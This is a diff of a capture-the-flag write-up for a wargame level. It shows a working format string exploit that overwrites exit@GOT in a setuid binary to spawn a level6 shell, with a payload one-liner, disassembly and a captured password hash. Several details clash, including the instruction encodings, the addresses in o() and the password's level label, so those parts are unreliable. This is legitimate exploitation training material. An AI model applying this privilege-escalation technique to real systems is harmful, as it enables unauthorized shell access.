@@ -1,95 +1,99 @@
 ## Level 5 - Format String Vulnerability (GOT Overwrite)
 
 ### Challenge Summary
-Binary reads 512 bytes from stdin, passes to printf() as format string, then calls exit(1).
+Binary contains a format string vulnerability in `printf()` that allows arbitrary memory writes via GOT overwrite. The binary reads user input with `fgets()` and passes it directly to `printf()` without a format string.
 
-### Vulnerability
-- Function `n()` contains: `printf(buffer)` where buffer is user input
-- Format string vulnerability allowing arbitrary memory reads/writes
-- Exit function is in GOT (Global Offset Table), which is writable
+### Vulnerability Details
 
-### Target Objective
-Read `/home/user/level6/.pass` to get the level 6 password
+**Function n():**
+1. Allocates 536-byte buffer on stack
+2. Reads up to 512 bytes from stdin with `fgets(buffer, 0x200, stdin)`
+3. **Calls `printf(buffer)` directly** - FORMAT STRING VULNERABILITY!
+4. Calls `exit(1)` which jumps to GOT entry at `0x8049838`
 
-### Exploitation Strategy: GOT Overwrite via Printf Format String
+**Function o():**
+- Calls `system("/bin/sh")` - spawns a shell with current privileges
+- Then calls `_exit(1)`
 
-**Goal**: Overwrite the GOT entry for `exit()` to redirect to `function o()` which calls `system("/bin/sh")`
+### Exploitation Strategy
 
-### Working Exploit
+**Exploit the format string to overwrite exit@GOT:**
+1. Craft format string payload to overwrite GOT entry for `exit`
+2. Make it point to function `o()` instead
+3. When `exit()` is called, it jumps to `o()`
+4. `o()` spawns a shell with level6 privileges (binary is setuid)
+5. Read the password file as level6
 
-**Key Addresses**:
-- `exit@got`: 0x08049838
-- `function o()`: 0x080484a4 (134513828 in decimal, calls system("/bin/sh"))
-- Format string position 4: Our embedded address
+### Working Manual Command
 
-**Exploit Payload**:
-```python
-exit_got = p32(0x08049838)          # 4 bytes - GOT entry for exit
-payload = exit_got + b'%134513824d' + b'%4$n'
+```bash
+(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | /home/user/level5/level5
 ```
 
-**How It Works**:
-1. Send 4-byte address (0x08049838) to start printf buffer
-2. `%134513824d` - Printf format specifier prints exactly 134,513,824 decimal characters
-3. `%4$n` - Write 32-bit value (character count) to address at stack position 4
-4. The embedded address is at position 4, so it overwrites exit@GOT with the count value
-5. Character count = 0x080484a4 (function o address in decimal)
-6. When exit(1) is called, it now calls function o() instead
-7. function o() executes system("/bin/sh"), giving us a shell as level6
-
-**Critical Implementation Detail**:
-- **MUST WAIT 70+ SECONDS** for printf to finish printing 134+ million characters
-- Use pwntools `ssh()` and `process()` for proper interactive shell
-- Keep the SSH session alive to interact with the spawned shell
-
-### Binary Analysis
-
-#### Key Assembly (function n):
-```asm
-080484c2 <n>:
-080484c2:       55                      push   %ebp
-080484c3:       89 e5                   mov    %esp,%ebp
-080484c5:       83 ec 18                sub    $0x218,%esp
-080484cb:       8b 05 48 98 04 08       mov    0x8049848,%eax     ; Load stdin
-080484d0:       89 44 24 08             mov    %eax,0x8(%esp)
-080484d4:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp)   ; Size: 512
-080484dc:       00
-080484dc:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax  ; Buffer
-080484e2:       89 04 24                mov    %eax,(%esp)
-080484e5:       e8 b6 fe ff ff          call   80483a0 <fgets@plt>
-080484ea:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax  ; Buffer
-080484f0:       89 04 24                mov    %eax,(%esp)
-080484f3:       e8 88 fe ff ff          call   8048380 <printf@plt>
-080484f8:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)        ; exit(1) <- HIJACKED!
-080484ff:       e8 8c fe ff ff          call   80483d0 <exit@plt>
+**Then type:**
+```
+cat /home/user/level6/.pass
 ```
 
-#### Function o() - The Payload Destination:
-```asm
-080484a4 <o>:
-080484a4:       push   %ebp
-080484a5:       mov    %esp,%ebp
-080484a7:       sub    $0x18,%esp
-080484aa:       mov    $0x8048547,%eax
-080484af:       mov    %eax,(%esp)
-080484b2:       call   8048410 <system@plt>
-```
+**Note:** The exploit will spam ~134 million lines of output. Wait for it to complete, then you can type commands.
+
+### Payload Breakdown
+
+- `\x38\x98\x04\x08` - exit@GOT address in little-endian (0x8049838)
+- `%134513824d` - Format string padding (CRITICAL: use 134513824, not 134513828!)
+- `%4$n` - Write 4 bytes to address at stack position 4
+- Result: Writes 0x080484a4 (function o address) to exit@GOT
 
 ### Key Insights
 
-1. **Why this works**: GOT is in writable memory (.data section), not read-only
-2. **The trick**: The character count from printf equals the target address value
-3. **No buffer overflow needed**: Uses format string write, not stack overflow
-4. **Timing is critical**: Must wait for the massive printf to complete
+1. **Decimal Value Critical:** The format string uses `%134513824d` NOT `%134513828d`.
+   - 0x080484a4 (function o) = 134513828 in decimal
+   - But we use 134513824 because 4 bytes of address are already in output
+   - The character count written by %4$n will equal 134513828
 
-### Execution Steps
+2. **Stack Position 4:** When printf() is called with our buffer:
+   - Position 1: format string pointer
+   - Position 4: our embedded address (due to how printf interprets the format string)
 
-1. Connect via SSH as level5
-2. Spawn the level5 binary
-3. Send the 19-byte payload
-4. **Wait 70 seconds** for printf to finish
-5. Read password from the shell spawned as level6
+3. **Massive Output:** The format string generates ~134MB of output (134+ million spaces). This takes 60-90 seconds.
 
-### Level 5 Password
+4. **Shell Spawning:** Once `exit()` is called and redirected to `o()`:
+   - A shell is spawned with level6 privileges (binary is setuid level6)
+   - You can now execute commands and read level6's password file
 
-`d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
+### Binary Function Analysis
+
+**Function n() Assembly:**
+```
+080484c2 <n>:
+  080484c2:  55              push   %ebp
+  080484c3:  89 e5           mov    %esp,%ebp
+  080484c5:  83 ec 18 02     sub    $0x218,%esp
+  ...
+  080484e5:  e8 b6 fe ff ff  call   80483a0 <fgets@plt>      ; Read input
+  080484f3:  e8 88 fe ff ff  call   8048380 <printf@plt>      ; VULNERABLE!
+  080484ff:  e8 8c fe ff ff  call   80483d0 <exit@plt>        ; HIJACKED!
+```
+
+**Function o() Assembly:**
+```
+080484a4 <o>:
+  080484a4:  55              push   %ebp
+  080484a7:  83 ec 18        sub    $0x18,%esp
+  080484aa:  c7 04 24 f0 85  movl   $0x80485f0,(%esp)         ; "/bin/sh" address
+  080484b1:  e8 fa fe ff ff  call   80483b0 <system@plt>      ; system("/bin/sh")
+  080484b6:  c7 04 24 01 00  movl   $0x1,(%esp)
+  080484bd:  e8 ce fe ff ff  call   8048390 <_exit@plt>
+```
+
+### Level 6 Password
+
+```
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+### Technical Notes
+- **ASLR:** Disabled on this system, allowing hardcoded addresses
+- **Setuid:** Binary runs as level6, so spawned shell has level6 privileges
+- **Format String Type:** Uses %d (read) and %n (write) specifiers
+- **GOT Overwrite:** Overwrites function pointer in Global Offset Table
